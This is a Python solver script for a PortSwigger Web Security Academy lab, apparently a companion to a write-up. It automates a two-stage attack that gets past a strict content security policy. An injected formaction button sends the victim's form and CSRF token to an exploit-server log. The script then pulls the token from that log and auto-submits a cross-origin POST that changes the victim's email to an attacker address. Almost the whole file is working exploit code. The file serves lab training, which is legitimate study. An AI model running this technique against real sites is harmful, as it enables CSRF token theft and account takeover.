#!/usr/bin/env python3
"""
Reflected XSS protected by very strict CSP, with dangling markup attack
PortSwigger Web Security Academy -- Cross-Site Scripting (XSS)

Companion script for the writeup: 29-reflected-xss-strict-csp-dangling-markup.md

What this does:
    The account page's CSP (default-src 'self', no unsafe-inline, no allowed
    external script hosts) blocks every form of script execution -- but it has
    no form-action directive, leaving form submissions completely unrestricted.

    Stage 1: inject a <button formaction="EXPLOIT/log" formmethod=GET
    formnovalidate>Click me</button> into the email field of the account page's
    email-change form, delivered via the exploit server as a full-page redirect.
    When the simulated victim clicks the button, their browser submits the
    entire form (CSRF token included) as a GET request to the exploit server,
    landing the token directly in its access log.

    Stage 2: read the stolen CSRF token out of the exploit server's log and
    deliver a second exploit page containing a plain HTML <form> that POSTs
    LAB-URL/my-account/change-email with that token and an attacker email --
    this runs on the exploit server's own origin, so the lab's CSP never
    applies to it at all.

Usage:
    python 29-reflected-xss-strict-csp-dangling-markup.py <lab-url>
    e.g. python 29-reflected-xss-strict-csp-dangling-markup.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import time
import urllib.parse
import httpx


def _get_exploit_server_url(client: httpx.Client, lab_url: str):
    r = client.get(f"{lab_url}/")
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    return m.group(1).rstrip("/") if m else None


def _exploit_server_deliver(exploit_url: str, body: str,
                             path: str = "/exploit",
                             headers: str = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8") -> bool:
    with httpx.Client(follow_redirects=True, timeout=20, verify=False) as c:
        form_data = {
            "urlIsHttps": "on",
            "responseFile": path,
            "responseHead": headers,
            "responseBody": body,
            "formAction": "STORE",
        }
        r_store = c.post(exploit_url, data=form_data)
        if r_store.status_code >= 400:
            print(f"[!] Exploit server STORE failed: {r_store.status_code}")
            return False
        form_data["formAction"] = "DELIVER_TO_VICTIM"
        r_deliver = c.post(exploit_url, data=form_data)
        return r_deliver.status_code < 400


def _exploit_server_logs(exploit_url: str) -> str:
    with httpx.Client(follow_redirects=True, timeout=20, verify=False) as c:
        r = c.post(exploit_url, data={
            "urlIsHttps": "on",
            "formAction": "ACCESS_LOG",
            "responseFile": "/exploit",
            "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
            "responseBody": "",
        })
    return r.text


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    exploit_url = _get_exploit_server_url(client, lab_url)
    if not exploit_url:
        print("[-] No exploit server found for this lab instance")
        return

    # Stage 1: formaction/GET button hijack to steal the CSRF token.
    button_inject = (
        f'"><button type=submit formaction="{exploit_url}/log" '
        f'formmethod=GET formnovalidate>Click me</button>'
    )
    steal_url = f"{lab_url}/my-account?email={urllib.parse.quote(button_inject)}"

    stage1_body = f'<script>document.location="{steal_url}";</script>'
    print("[*] Stage 1: delivering formaction button hijack")
    _exploit_server_deliver(exploit_url, stage1_body)
    time.sleep(12)

    logs = _exploit_server_logs(exploit_url)
    csrf_m = re.search(r'csrf=([a-zA-Z0-9]{20,})', logs)
    if not csrf_m:
        print("[-] Could not extract CSRF token from exploit server logs")
        print(f"[*] Log excerpt: {logs[:600]}")
        return

    csrf_token = csrf_m.group(1)
    print(f"[+] Stolen CSRF token: {csrf_token}")

    # Stage 2: spend the stolen token via a cross-origin form POST, run from
    # the exploit server's own origin so the lab's CSP doesn't apply to it.
    stage2_body = (
        f'<form action="{lab_url}/my-account/change-email" method="POST">'
        f'<input name="email" value="hacker@evil-user.net">'
        f'<input name="csrf" value="{csrf_token}">'
        f'<input type="submit">'
        f'</form>'
        f'<script>document.forms[0].submit();</script>'
    )
    print("[*] Stage 2: changing victim email to hacker@evil-user.net")
    _exploit_server_deliver(exploit_url, stage2_body)
    time.sleep(8)

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
